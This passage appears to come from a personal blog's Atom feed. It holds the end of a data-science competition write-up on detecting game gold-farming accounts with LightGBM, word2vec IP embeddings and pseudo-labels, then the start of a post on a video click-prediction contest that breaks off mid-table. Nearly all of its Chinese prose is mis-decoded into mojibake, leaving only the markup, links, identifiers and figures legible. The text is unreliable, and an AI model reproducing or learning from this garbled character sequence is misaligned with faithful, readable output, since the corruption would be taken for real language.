title="Ê†áÁ≠æ‰∫îÊäò‰∫§ÂèâÁªüËÆ°ÁâπÂæÅ"></a>Ê†áÁ≠æ‰∫îÊäò‰∫§ÂèâÁªüËÆ°ÁâπÂæÅ</h2><p>Âú®Êé®Ëçê‰ªªÂä°‰∏≠ÔºåÁªèÂ∏∏‰ΩøÁî®ÁÇπÂáªÁéáÁâπÂæÅÔºåÂç≥ÁªüËÆ°Êüê‰∏™Á±ªÂà´ÁâπÂæÅ‰∏ãÁÇπÂáªÂïÜÂìÅÁöÑÊ¶ÇÁéá„ÄÇÂêåÊ†∑‰Ωú‰∏∫‰∫åÂàÜÁ±ª‰ªªÂä°ÔºåÊàë‰ª¨‰πüÂèØ‰ª•ÊûÑÈÄ†Êüê‰∏™Á±ªÂà´ÁâπÂæÅ‰∏ãÊòØÂ∑•‰ΩúÂÆ§ÁöÑÊ¶ÇÁéá„ÄÇËØ•Á±ªÁâπÂæÅÂà©Áî®‰∫ÜÊ†áÁ≠æ‰ø°ÊÅØÔºåÂÆπÊòìÂá∫Áé∞Ê†áÁ≠æÊ≥ÑÈú≤ÈóÆÈ¢òÔºåÊâÄ‰ª•Âú®ÂÆûÈôÖÊìç‰Ωú‰∏≠ÔºåÂ∞ÜËÆ≠ÁªÉÈõÜÂàÜ‰∏∫5‰ªΩÔºåÊØèÊ¨°‰ΩøÁî®4‰ªΩÂÅöÊ†áÁ≠æÁªüËÆ°ÔºåÂæóÂà∞ÁöÑÊ¶ÇÁéáÂÄºÁªôÂè¶Â§ñ1‰ªΩÂÅöÁâπÂæÅ„ÄÇÊú¨ÊñπÊ°àÊûÑÈÄ†‰∫Ü chat_cnt Âíå clientip_3 Á±ªÂà´‰∏ãÁöÑÂ∑•‰ΩúÂÆ§Ê¶ÇÁéá„ÄÇ</p><h2 id="embedding-ÁâπÂæÅ"><a href="#embedding-ÁâπÂæÅ" class="headerlink" title="embedding ÁâπÂæÅ"></a>embedding ÁâπÂæÅ</h2><p>ip Â≠óÊÆµËÉΩÂ∏ÆÂä©Êàë‰ª¨ÂæàÂ•ΩÁöÑÂà§Êñ≠ÊòØÂê¶Â≠òÂú®Ë¥¶Êà∑ËÅöÈõÜË°å‰∏∫ÔºåÂÅáÂ¶ÇÊàë‰ª¨ËÉΩÂ§üÂ∞ÜÊó†Ê≥ïÂÆöÈáèËÆ°ÁÆóÁöÑ ip Âú∞ÂùÄËΩ¨ÊàêÊ®°ÂûãËÉΩÂ§üËØÜÂà´ÁöÑÊï∞Â≠óÁâπÂæÅÔºåÂ∞Ü‰ºöÂ∏ÆÂä©Ê®°ÂûãÊõ¥Â•ΩÂú∞Âà©Áî® ip ‰ø°ÊÅØ„ÄÇÊàë‰ª¨Êï¥ÁêÜÂá∫ÊØè‰∏™Ë¥¶Êà∑Âú®Âì™‰∫õ ip Êìç‰ΩúËøáÔºåÂ∞ÜËøô‰∫õ ip ÂàóË°®‰Ωú‰∏∫ sentence ËæìÂÖ•Âà∞ word2vec Ê®°ÂûãÔºåÂ∞Ü ip Êò†Â∞Ñ‰∏∫ÂêëÈáèÔºåÁªèÂ∏∏Âá∫Áé∞Âú®‰∏ä‰∏ãÊñá‰∏≠ÁöÑ ip Âú® embedding Á©∫Èó¥‰∏≠‰πüÁõ∏Ëøë„ÄÇÊúÄÂêéÂ∞ÜË¥¶Êà∑‰∏ãÊâÄÊúâ ip ÁöÑÂêëÈáèÂèñÂπ≥Âùá‰Ωú‰∏∫Êñ∞ÁâπÂæÅ„ÄÇÊïà‰ªøÂØπ ip ÁâπÂæÅÁöÑÂ§ÑÁêÜÔºåÊàë‰ª¨ËøòÂØπ worldid Âíå job ÂÅö‰∫ÜÁ±ª‰ººÁöÑÊìç‰Ωú„ÄÇ</p><h2 id="ÊµÅÊ∞¥ÁâπÂæÅ"><a href="#ÊµÅÊ∞¥ÁâπÂæÅ" class="headerlink" title="ÊµÅÊ∞¥ÁâπÂæÅ"></a>ÊµÅÊ∞¥ÁâπÂæÅ</h2><p>ÂÜ≥ËµõÁªôÂá∫‰∫ÜËßíËâ≤ÁöÑËØ¶ÁªÜË¥ßÂ∏ÅÂíåÁâ©ÂìÅÊµÅÊ∞¥‰ø°ÊÅØ(ÂΩìÂ§©ÊåâÊó∂Èó¥È°∫Â∫èÂâç300Êù°ËÆ∞ÂΩï)„ÄÇÁªìÂêà‰∏öÂä°ËÄÉËôëÔºåÂ∑•‰ΩúÂÆ§ÂæÄÂæÄ‰ºöËøõË°åÂ§ßÈáèÁöÑ‰∫§ÊòìË°å‰∏∫ÔºåÂÆûÁé∞Áâ©ÂìÅÊàñË¥ßÂ∏ÅÂ•óÂà©„ÄÇÊâÄ‰ª•ÂØπË¥ßÂ∏ÅÂèòÂåñÊï∞ÔºåÈÅìÂÖ∑ÂèòÂä®Êï∞ÈáèËøõË°åÁªüËÆ°ÔºåÂåÖÊã¨Ê±ÇÂíåÔºåÊ±ÇÂπ≥ÂùáÂÄºÔºåÊ±ÇÊúÄÂ§ßÂÄºÂíåËÆ°Êï∞„ÄÇË¥ßÂ∏ÅÂèòÂåñÂèØ‰ª•ËØ¶ÁªÜÂà∞Â¢ûÂä†ÊàñÂáèÂ∞ëÔºåÂèØ‰ª•Ëøõ‰∏ÄÊ≠•Âú®Ëøô‰∏§ÁßçÊÉÖÂÜµ‰∏ãËøõË°åÁªüËÆ°„ÄÇÊ≠§Â§ñÊï∞ÊçÆÈõÜËøòÁªôÂá∫‰∫Ü‰∫§ÊòìÁöÑÁêÜÁî±ÔºåÊàë‰ª¨ËøòÂèØ‰ª•ÁªüËÆ°ÊØè‰∏™ÁêÜÁî±‰∏ãËøõË°å‰∫§ÊòìÁöÑË¥ßÂ∏ÅÊï∞ÂíåÁâ©ÂìÅÊï∞„ÄÇË¥ßÂ∏ÅÁ±ªÂûãÔºåË¥ßÂ∏ÅÊµÅÂä®‰∏ÄÁ∫ßÂéüÂõ†ÔºåÈÅìÂÖ∑ÊµÅÂä®‰∏ÄÁ∫ßÂéüÂõ†ÔºåÂ∞§ÂÖ∂ÊòØÈÅìÂÖ∑IDÔºåËøôÂá†‰∏™Á±ªÂà´ÁâπÂæÅÁª¥Â∫¶ËæÉÂ§ßÔºåÂàÜÂà´ËøõË°åÁªüËÆ°‰ºöÂºïÂÖ•Â§ßÈáèÁâπÂæÅÔºåËÄå‰∏îÊï∞ÊçÆÊôÆÈÅçÂ≠òÂú®Á®ÄÁñèÈóÆÈ¢ò„ÄÇ‰ª•ÈÅìÂÖ∑ID‰∏∫‰æãÔºåID ‰∏∫342ÁöÑÁâ©ÂìÅÂè™‰∫§ÊòìËøá‰∏ÄÊ¨°ÔºåÊâÄ‰ª•‚ÄúÁâ©ÂìÅ342ÁöÑ‰∫§ÊòìÊï∞Èáè‚ÄùÁâπÂæÅÂ∞±‰ºöÂçÅÂàÜÁ®ÄÁñèÔºåÂè™Êúâ‰∏Ä‰∏™Ë¥¶Êà∑‰∏ãËØ•ÁâπÂæÅÊúâÁªüËÆ°ÂÄº„ÄÇ</p><p>ÊúÄÁªàÔºåÊú¨ÊñπÊ°àÊÄªÂÖ±‰ΩøÁî®704‰∏™ÁâπÂæÅÔºåÈáçË¶ÅÊÄßÊØîËæÉÈ´òÁöÑÁâπÂæÅÂ¶ÇÂõæ6ÊâÄÁ§∫ÔºåÂèØ‰ª•ÁúãÂá∫Ë¥¶Êà∑ÁöÑÂú®Á∫øÊó∂ÈïøÔºåÁ¶ªÁ∫øÊó∂ÈïøÁâπÂæÅÂæàÈáçË¶ÅÔºåÂõ†‰∏∫Â∑•‰ΩúÂÆ§Áõ∏ËæÉ‰∫éÊ≠£Â∏∏Áî®Êà∑‰ºöËä±Ë¥πÊõ¥Â§öÁöÑÊó∂Èó¥ËøõË°åÊ∏∏ÊàèÔºåËøΩÊ±ÇÂà©ÁõäÁöÑÊúÄÂ§ßÂåñ„ÄÇÊó∂ÊÆµÔºàhourÔºâÁâπÂæÅ‰πüÊØîËæÉÈáçË¶ÅÔºåÂ∑•‰ΩúÂÆ§‰∏çÂàÜÁôΩÂ§©ÈªëÂ§úËøõË°åÊ∏∏ÊàèÔºåËÄåÊ≠£Â∏∏ÁöÑÁî®Êà∑‰∏ç‰ºöÂú®ÁôΩÂ§©Ëä±Ë¥πÂ§ßÈáèÁöÑÊó∂Èó¥ËøõË°åÊ∏∏Êàè„ÄÇÂä†ÂÖ•ÊµÅÊ∞¥ÁâπÂæÅÂêéÔºåReason12‰∏ãÁöÑË¥ßÂ∏Å‰∫§ÊòìÂ∞§‰∏∫ÈáçË¶Å„ÄÇ</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/tencent2020_6.png" alt="Âõæ6 ÁâπÂæÅÈáçË¶ÅÊÄß" title="">                </div>                <div class="image-caption">Âõæ6 ÁâπÂæÅÈáçË¶ÅÊÄß</div>            </figure></div><h1 id="‰º™Ê†áÁ≠æ"><a href="#‰º™Ê†áÁ≠æ" class="headerlink" title="‰º™Ê†áÁ≠æ"></a>‰º™Ê†áÁ≠æ</h1><p>Âú®ËÆ≠ÁªÉÊ®°ÂûãÊó∂ÔºåÊàë‰ª¨ÊÄªÂ∏åÊúõËæìÂÖ•ÁöÑÊï∞ÊçÆÊï∞ÊçÆÈáèÂ∞ΩÂèØËÉΩÂ§ßÔºåÊï∞ÊçÆÊ†áÁ≠æÂ∞ΩÂèØËÉΩÂàÜÂ∏ÉÂùáÂåÄ„ÄÇÂú®ÂØπÊµãËØïÈõÜËøõË°åÈ¢ÑÊµãÊó∂ÔºåLightGBM Ê®°ÂûãËæìÂá∫ÁöÑÊòØË¥¶Êà∑ÊòØÊâìÈáëÂ∑•‰ΩúÂÆ§ÁöÑÊ¶ÇÁéáÔºå‰πüÂèØ‰ª•ÁêÜËß£‰∏∫ÁΩÆ‰ø°Â∫¶Ôºå‰ªéÂõæ7ÂèØ‰ª•ÁúãÂá∫ÔºåÊ¶ÇÁéáÂàÜÂ∏ÉÂ§ßÂ§öÂàÜÂ∏ÉÂú®‰∏§Â§¥ÔºåÊûÅÊúâÂèØËÉΩÊòØÂíåÊûÅÊúâÂèØËÉΩ‰∏çÊòØ„ÄÇÊàë‰ª¨ÂÆåÂÖ®ÂèØ‰ª•Â∞ÜÁΩÆ‰ø°Â∫¶ËæÉÈ´òÁöÑÊµãËØïÈõÜÊï∞ÊçÆ‰Ωú‰∏∫Ê†áÁ≠æ‰∏∫1ÁöÑÊñ∞ËÆ≠ÁªÉÈõÜÔºå‰ªéËÄåËææÂà∞Êâ©Â¢ûËÆ≠ÁªÉÈõÜ‰∏îÁ®çÂæÆÂπ≥Ë°°Ê†∑Êú¨Ê†áÁ≠æÁöÑÁõÆÁöÑ„ÄÇÁî±‰∫éÊú¨Ê¨°ÊØîËµõÊ≤°ÊúâÊ¶úÂçïÔºåÊâÄ‰ª•ËøôÈÉ®ÂàÜÈÄâÊã©ÊØîËæÉË∞®ÊÖéÔºåÂè™ÊåëÂá∫Ê¶ÇÁéáÂÄºÂ§ß‰∫é0.99ÁöÑÊµãËØïÈõÜÊï∞ÊçÆÊ∑ªÂä†Âà∞ËÆ≠ÁªÉÈõÜÔºåÁ∫ø‰∏ãÂ§ßÊ¶ÇËÉΩÊèêÂçá0.006„ÄÇ</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/tencent2020_7.png" alt="Âõæ7 Ê¶ÇÁéáÂÄºÂàÜÂ∏É" title="">                </div>                <div class="image-caption">Âõæ7 Ê¶ÇÁéáÂÄºÂàÜÂ∏É</div>            </figure></div><h1 id="Ê®°Âûã"><a href="#Ê®°Âûã" class="headerlink" title="Ê®°Âûã"></a>Ê®°Âûã</h1><p>Âà©Áî® LightGBM Ê®°ÂûãËøõË°å‰∫åÂàÜÁ±ª‰ªªÂä°ÔºåÂ∑•‰ΩúÂÆ§Ë¥¶Âè∑Ê†áÁ≠æËÆæÁΩÆ‰∏∫1ÔºåÊ≠£Â∏∏Ë¥¶Âè∑ËÆæÁΩÆ‰∏∫0„ÄÇÈááÁî®‰∫îÊäò‰∫§ÂèâÊ≥ïÔºåÂ∞Ü3.1Âè∑ÁöÑÊï∞ÊçÆÂàÜ‰∏∫‰∫î‰ªΩÔºåÊØèÊ¨°‰ΩøÁî®4‰ªΩËÆ≠ÁªÉÔºåÂè¶Â§ñ‰∏Ä‰ªΩÁî®Êù•È™åËØÅ„ÄÇÁî±‰∫éÊ†∑Êú¨Ê†áÁ≠æÂàÜÂ∏É‰∏çÂùáË°°ÔºåÊàë‰ª¨‰∏çËÉΩÁî®0.5‰Ωú‰∏∫Ê≠£Ë¥üÊ†∑Êú¨ÁöÑÂàÜÂâ≤ÁÇπÔºåËÄåÂ∫îËØ•ÈááÁî®ÊØî‰æãÊ≥ï„ÄÇÊ≠£Ê†∑Êú¨Â§ßÊ¶ÇÂç†ÊÄªÊ†∑Êú¨ÁöÑ13.66%ÔºåÊâÄ‰ª•Â∞ÜÊµãËØïÈõÜÁöÑÈ¢ÑÊµãÊ¶ÇÁéáÊåâ‰ªéÂ§ßÂà∞Â∞èÊéíÂ∫èÔºåÂâç13.66%ÊåëÈÄâ‰∏∫Â∑•‰ΩúÂÆ§Ë¥¶Âè∑„ÄÇÂú®Êú¨Âú∞È™åËØÅÈõÜ‰∏äÔºåÁ≤æÁ°ÆÁéáËææÂà∞0.9700214132762313ÔºåÂè¨ÂõûÁéáËææÂà∞0.9324642227014311ÔºåÊØîËµõÊåáÊ†áËææÂà∞0.9603513111071851„ÄÇ</p><h1 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h1><p>Áî±‰∫éÊòØÈ´òÊ†°ËµõÔºå‰∏ªÂäûÊñπÂ§ßÊ¶ÇËÄÉËôëÂà∞Â≠¶ÁîüÂÖöÁöÑÊú∫Âô®ÊÄßËÉΩÈôêÂà∂ÔºåÊâÄ‰ª•Êï∞ÊçÆÈõÜÂπ∂‰∏çÊòØÂæàÂ§ßÔºåÊØîËµõÊó∂Èó¥‰πüÊØîËæÉÁ¥ßÂáëÔºåÂàùËµõ12‰∏™Â∞èÊó∂ÔºåÂÜ≥Ëµõ‰∏âÂ§©ÔºåÊï¥‰Ωì‰ΩìÈ™åÊØîËæÉÂ•Ω„ÄÇËµõÂêéÈòÖËØªÁ¨¨‰∏ÄÂ§ß‰Ω¨ÁöÑÊñπÊ°àÔºåÁâπÂæÅÂ∑•Á®ãÊÄùË∑ØÂü∫Êú¨Áõ∏ÂêåÔºå‰ΩÜÂ§ß‰Ω¨Âú®ÊµÅÊ∞¥ÁªüËÆ°ÊñπÈù¢ÂÅöÁöÑÊõ¥ÁªÜËá¥ÔºåÂπ∂Ê≤°ÊúâÂÉèÊàëÁõ¥Êé•‰∏ÄËÇ°ËÑëÁöÑÂØπÊâÄÊúâÂàÜÁ±ªËøõË°åÁªüËÆ°„ÄÇÊ≠§Â§ñËøòÂà©Áî®ÂØπÊäóËÆ≠ÁªÉËøõË°åÁâπÂæÅÁ≠õÈÄâÔºåÂà†ÂéªÂú®ËÆ≠ÁªÉÈõÜÂíåÊµãËØïÈõÜ‰∏äÂàÜÂ∏ÉÂ∑ÆÂºÇËæÉÂ§ßÁöÑÁâπÂæÅ„ÄÇ</p><blockquote><p>ÈÄöËøárole_itemflowÔºåÊûÑÈÄ†‰∫Ü‰∏ªË¶ÅÁâ©ÂìÅÁ±ªÂûãÔºàÁ±ªÂûã20025, 20035, 20036, 20028ÔºâÁöÑÊµÅÊ∞¥Ê¨°Êï∞ÂíåÁâ©ÂìÅÂèòÂä®Êï∞ÈáèÔºå‰∏ªË¶ÅÊµÅÊ∞¥ÂéüÂõ†ÔºàÂéüÂõ†84, 12, 85, 5ÔºâÁöÑÊµÅÊ∞¥Ê¨°Êï∞„ÄÇ</p></blockquote><h1 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h1><ul><li><a href="https://gslab.qq.com/article-699-1.html" target="_blank" rel="noopener">ËµõÈÅìÁ¨¨‰∏ÄÂêçÊñπÊ°àÂàÜ‰∫´</a></li></ul>]]></content>
        <author>
            <name><![CDATA[LogicJake‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2020/02/10/%E5%9B%BE%E7%81%B5%E8%81%94%E9%82%A6%E8%A7%86%E9%A2%91%E7%82%B9%E5%87%BB%E9%A2%84%E6%B5%8B%E5%A4%A7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[ÂõæÁÅµËÅîÈÇ¶ËßÜÈ¢ëÁÇπÂáªÈ¢ÑÊµãÂ§ßËµõ-ËµõÂêéÊÄªÁªì]]></title>
        <updated>2020-04-21T13:42:03+08:00</updated>
        <link href="https://www.logicjake.xyz/2020/02/10/%E5%9B%BE%E7%81%B5%E8%81%94%E9%82%A6%E8%A7%86%E9%A2%91%E7%82%B9%E5%87%BB%E9%A2%84%E6%B5%8B%E5%A4%A7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2020/02/10/%E5%9B%BE%E7%81%B5%E8%81%94%E9%82%A6%E8%A7%86%E9%A2%91%E7%82%B9%E5%87%BB%E9%A2%84%E6%B5%8B%E5%A4%A7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<p>ÊúÄÁªàÊàêÁª©ÔºöA, BÊ¶úÁ¨¨‰∏â„ÄÇ<br>ÊØîËµõÂú∞ÂùÄÔºö<a href="https://www.turingtopia.com/competitionnew/detail/e4880352b6ef4f9f8f28e8f98498dbc4/sketch" target="_blank" rel="noopener">https://www.turingtopia.com/competitionnew/detail/e4880352b6ef4f9f8f28e8f98498dbc4/sketch</a><br>‰ª£Á†ÅÂú∞ÂùÄÔºö<a href="https://github.com/LogicJake/tuling-video-click-top3" target="_blank" rel="noopener">https://github.com/LogicJake/tuling-video-click-top3</a></p><h1 id="ËµõÈ¢òËÉåÊôØ"><a href="#ËµõÈ¢òËÉåÊôØ" class="headerlink" title="ËµõÈ¢òËÉåÊôØ"></a>ËµõÈ¢òËÉåÊôØ</h1><p>ÁßªÂä®‰∫íËÅîÁΩëÁöÑÂø´ÈÄüÂèëÂ±ïÔºåÂÇ¨Áîü‰∫ÜÊµ∑ÈáèËßÜÈ¢ëÊï∞ÊçÆÁöÑ‰∫ßÁîüÔºå‰πü‰∏∫Áî®Êà∑Êèê‰æõ‰∫ÜÁ±ªÂûã‰∏∞ÂØåÁöÑËßÜÈ¢ëÊï∞ÊçÆÁ±ªÂûã„ÄÇÈù¢ÂØπÂ¶Ç‰Ωï‰ªéÊµ∑ÈáèËßÜÈ¢ëÊï∞ÊçÆÁ±ªÂûã‰∏≠ÈÄâÊã©Áî®Êà∑ÂñúÊ¨¢ÁöÑÁ±ªÂûãÁöÑËøô‰∏ÄÈöæÈ¢òÔºå‰Ωú‰∏∫‰∏ÄÂÆ∂Êã•ÊúâÊµ∑ÈáèËßÜÈ¢ëÁ¥†ÊùêÂíåÁî®Êà∑Ë°å‰∏∫ÁöÑÊï∞ÊçÆÂÖ¨Âè∏ÔºåÂ∏åÊúõÈÄöËøáÁî®Êà∑Ë°å‰∏∫Êï∞ÊçÆÔºåÁî®Êà∑ÁâπÂæÅÔºå‰ª•ÂèäËßÜÈ¢ëÁâπÂæÅÔºåÂèØ‰ª•Âú®ÂÖÖË∂≥Êï∞ÊçÆÂü∫Á°Ä‰∏äÁ≤æÂáÜÁöÑÊé®ËçêÁªôÁî®Êà∑ÂñúÊ¨¢ÁöÑËßÜÈ¢ëÁ±ªÂûã„ÄÇ</p><p>Êú¨Ê¨°Á´ûËµõÁöÑÁõÆÁöÑÊòØ‰ª•Áî®Êà∑ÁöÑËßÜÈ¢ëË°å‰∏∫Êï∞ÊçÆ‰∏∫Âü∫Á°ÄÔºåÊûÑÂª∫Êé®ËçêÊ®°ÂûãÔºåÂèÇËµõÈòü‰ºçÂàôÈúÄË¶ÅÊê≠Âª∫‰∏™ÊÄßÂåñÊé®ËçêÊ®°Âûã„ÄÇÂ∏åÊúõÂèÇËµõÈòü‰ºçËÉΩÂ§üÊåñÊéòÊï∞ÊçÆËÉåÂêé‰∏∞ÂØåÁöÑÂÜÖÊ∂µÔºå‰∏∫ÁßªÂä®Áî®Êà∑Âú®ÂêàÈÄÇÁöÑÊó∂Èó¥„ÄÅÂêàÈÄÇÁöÑÂú∞ÁÇπÁ≤æÂáÜÊé®ËçêÁî®Êà∑ÊÑüÂÖ¥Ë∂£ÁöÑÂÜÖÂÆπÔºåÊèêÈ´òÁî®Êà∑Âú®Êï∞ÊçÆÈõÜ‰∏äÁöÑÁÇπÂáªË°å‰∏∫„ÄÇ</p><p>ÂèÇËµõËÄÖÈÄöËøáÊûÑÂª∫Êé®ËçêÊ®°ÂûãÔºåÈ¢ÑÊµãÂæÖÊµãËØïÊï∞ÊçÆ‰∏≠Áî®Êà∑Âú®ÂØπÂ∫îÁöÑËßÜÈ¢ë‰∏äÊòØÂê¶‰ºö‰∫ßÁîüÁÇπÂáªË°å‰∏∫„ÄÇ</p><h1 id="Êï∞ÊçÆËØ¥Êòé"><a href="#Êï∞ÊçÆËØ¥Êòé" class="headerlink" title="Êï∞ÊçÆËØ¥Êòé"></a>Êï∞ÊçÆËØ¥Êòé</h1><p>Á¨¨‰∏ÄÈÉ®ÂàÜÊòØÁî®Êà∑Âú®ËµÑËÆØÂÖ®ÈõÜ‰∏äÁöÑÁßªÂä®Á´ØË°å‰∏∫Êï∞ÊçÆÔºàDÔºâ„ÄÇ</p><p>ËÆ≠ÁªÉÊï∞ÊçÆÂåÖÂê´‰∫ÜÊäΩÊ†∑Âá∫Êù•ÁöÑ‰∏ÄÂÆöÈáèÁî®Êà∑Âú®‰∏âÂ§©‰πãÂÜÖÁöÑÁßªÂä®Á´ØË°å‰∏∫Êï∞ÊçÆÔºàDÔºâÔºåËØÑÂàÜÊï∞ÊçÆÊòØËøô‰∫õÁî®Êà∑Âú®‰πãÂêé‰∏ÄÂ§©ÂØπÂ≠êÈõÜÔºàPÔºâÁöÑÁÇπÂáªÊï∞ÊçÆ„ÄÇÂèÇËµõËÄÖË¶Å‰ΩøÁî®ËÆ≠ÁªÉÊï∞ÊçÆÂª∫Á´ãÊé®ËçêÊ®°ÂûãÔºåÂπ∂ËæìÂá∫Áî®Êà∑Âú®Êé•‰∏ãÊù•‰∏ÄÂ§©ÁÇπÂáªË°å‰∏∫ÁöÑÈ¢ÑÊµãÁªìÊûú„ÄÇ</p><h1 id="Ëß£ÂÜ≥ÊñπÊ°à"><a href="#Ëß£ÂÜ≥ÊñπÊ°à" class="headerlink" title="Ëß£ÂÜ≥ÊñπÊ°à"></a>Ëß£ÂÜ≥ÊñπÊ°à</h1><h2 id="Êï∞ÊçÆÊé¢Á¥¢"><a href="#Êï∞ÊçÆÊé¢Á¥¢" class="headerlink" title="Êï∞ÊçÆÊé¢Á¥¢"></a>Êï∞ÊçÆÊé¢Á¥¢</h2><p>ÈÄöËøáÊï∞ÊçÆÊù•Ê∫êÔºåÊàë‰ª¨ËÉΩÂ§üÊõ¥Ê∏ÖÊ•öÂú∞‰∫ÜËß£Êï∞ÊçÆÔºå‰∫ÜËß£‰∏öÂä°ËÉåÊôØ„ÄÇÊØîËµõÊï∞ÊçÆÈááÈõÜ‰∫é‰∏ÄÊ¨æÂè´‚Äú‰∫øÂàªÁúãÁÇπ‚ÄùÁöÑ APPÔºåÊ≠§ APP ÂÆâÂçìÁã¨Âç†ÔºåÂõ†‰∏∫ÂÖ∂Êüê‰∫õÊµÅÊ∞ìÊìç‰ΩúÂú®ËãπÊûúÈÇ£ËæπÂ∫îËØ•Ëøá‰∏ç‰∫ÜÂÆ°„ÄÇËøôÊ¨æ APP ‰ª•ÈòÖËØªËµöÈí±ÔºàÁúãÂ∫îÁî®Â∏ÇÂú∫ËØÑËÆ∫ÊèêÁé∞ÂæàÂõ∞ÈöæÔºâ‰∏∫Âê∏ÂºïÁÇπÂê∏ÂºïÁî®Êà∑‰ΩøÁî®Ôºå‰ΩÜÊúâ‰∫õËø∑‰πãÊìç‰ΩúÔºåÂú®‰ΩøÁî®ËøáÁ®ã‰∏≠‰ºöÂá∫Áé∞ÂπøÂëäÂíå‰∏ãËΩΩÂºπÁ™óÔºåÁîöËá≥ÈÄÄÂá∫ËøôÊ¨æ APP Âêé‰πüËÉΩÁªôÊàëÂºπÔºàÂ¶ÇÂõæ1Â∑¶Ôºâ„ÄÇAPP Êé®ËçêÁöÑËßÜÈ¢ëÂ§ßÂ§öÊòØÂΩ±ËßÜÂâ™ËæëÔºåÊ≤°Êúâ‰ªª‰ΩïÊó∂ÊïàÊÄßÔºåÊé®ËçêÁ≠ñÁï•‰πüÂæàÂçï‰∏ÄÔºöÊé®Ëçê‰∏é‰∏äÊ¨°ÁÇπÂáªÁõ∏‰ººÁöÑËßÜÈ¢ë„ÄÇ‰ªéÂõæ1Âè≥ÂèØ‰ª•ÁúãÂà∞ÔºåÂΩìÊàëÁÇπÂáª‰∫Ü‚ÄúÈÇ£Âπ¥Ëä±ÂºÄ‚ÄùÁöÑËßÜÈ¢ëÁâáÊÆµÂêéÔºåÂà∑Êñ∞‰πãÂêéÂÜçÊé®ËçêÁöÑÂ∞±ÊòØËØ•ÂΩ±ËßÜÂâßÁõ∏ÂÖ≥„ÄÇ</p><center class="half">    <img src="http://pic.logicjake.xyz/app%E5%B1%95%E7%A4%BA.jpg" style="margin: auto;max-width: 30%; margin-right:10%;"/><img src="http://pic.logicjake.xyz/app%E5%B1%95%E7%A4%BA%E8%A7%86%E9%A2%91.gif" style="margin: auto;max-width: 30%;"/>    <div style="margin-top: 2%">Âõæ1 APP ‰ΩøÁî®Â±ïÁ§∫</div></center><p>‰ªé‰∏Ä‰∏™Áî®Êà∑ÁöÑËßíÂ∫¶ÔºåËøôÊ¨æ APP ÁöÑÁî®Êà∑‰ΩìÈ™å‰∏ç‰Ω≥ÔºåÈ¶ñÂÖàÂπøÂëäÂºπÂá∫ÔºåËØØËß¶‰∏ãËΩΩËÆ©ÊàëÊó†Ê≥ïÂøçÂèóÔºåÊâÄ‰ª•‰∏çÂèØËÉΩÊåÅÁª≠‰ΩøÁî®„ÄÇÂç≥‰ΩøÊúâ‰∫õ‰∫∫‰∏∫‰∫ÜËµöÈí±‰ΩøÁî®Ôºå‰πüÊúâÊûÅÂ§ßÂá†Áéá‰∏∫‰∫ÜÂ•ñÂä±ÂéªÁÇπÂáªËßÜÈ¢ëÔºåËøôÊ†∑‰ºö‰∫ßÁîüÂ§ßÈáè‰∏çÂèØ‰ø°ÁöÑÊìç‰ΩúÊï∞ÊçÆ„ÄÇÂΩì‰∏Ä‰∏™‰∫∫ÁöÑË°å‰∏∫Êï∞ÊçÆ‰∏çÂèØ‰ø°ÔºåÂØπÂÖ∂Êú™Êù•ÁöÑÁÇπÂáªÈ¢Ñ‰º∞‰πüÂ∞±Êó†‰ªéË∞àËµ∑‰∫Ü„ÄÇÂú®ÊØîËµõ‰∏≠‰πüÊúâÁ±ª‰ººÁöÑ‰Ωì‰ºöÔºåËÆ∏Â§ö ctr È¢Ñ‰º∞‰∏≠‰ΩøÁî®ÁöÑÂ∏∏ËßÑÁâπÂæÅÊî∂ÁõäÂæà‰ΩéÁîöËá≥Êó†Êïà„ÄÇ</p><p>ÂõûÂΩíÂà∞Êï∞ÊçÆÊú¨Ë∫´ÔºåËÆ≠ÁªÉÈõÜÊÄªÂÖ±ÁªôÂá∫‰∫Ü‰ªé2019.11.08 ~ 2019.11.10ÁöÑ‰∏âÂ§©Êï∞ÊçÆÔºåÈúÄË¶ÅÈ¢ÑÊµã2019.11.11ÁöÑÁî®Êà∑ÁÇπÂáªË°å‰∏∫„ÄÇÈ¶ñÂÖàËßÇÂØü‰∏Ä‰∏ãÊñ∞ËÄÅÁî®Êà∑ÂàÜÂ∏ÉÔºå‰∏ãË°®ÂàóÂá∫‰∫Ü9Ôºå10Ôºå11‰∏âÂ§©Êò®Êó•ËÄÅÁî®Êà∑Âç†ÊØî„ÄÇÂèØ‰ª•ÁúãÂá∫Êò®Êó•ËÄÅÁî®Êà∑Âç†ÊØîËøòÊòØÊå∫È´òÔºåÊâÄ‰ª•Âú®ÂêéÈù¢ÁöÑÁâπÂæÅÂ∑•Á®ãÂÅö‰∫ÜÂ§ßÈáèÈíàÂØπÁî®Êà∑Êò®Êó•Ë°å‰∏∫ÁöÑÁâπÂæÅ„ÄÇÊåâÈÅìÁêÜËØ¥ËøôÁßç‰ΩìÈ™åÊÑü‰∏çÂ•ΩÁöÑ APPÔºåÂú®Áî®Êà∑ÊâãÊú∫‰∏äÂ≠òÊ¥ªÊó∂Èó¥‰∏ç‰ºöÂ§™ÈïøÔºåÂ∫îËØ•‰∏ç‰ºöÂ≠òÂú®Ëøô‰πàÈ´òÁöÑËÄÅÁî®Êà∑ÊØî‰æãÔºå‰πü‰∏çÁü•ÈÅìÊòØÂ•ñÂä±Ëµ∑Âà∞‰∫Ü‰ΩúÁî®ËøòÊòØÊï∞ÊçÆÊèê‰æõÊñπÁâπÊÑèÁ≠õÈÄâÂá∫‰∏ÄÈÉ®ÂàÜÊ¥ªË∑ÉÁî®Êà∑„ÄÇ</p><table><thead><tr><th align="center">day</th><th 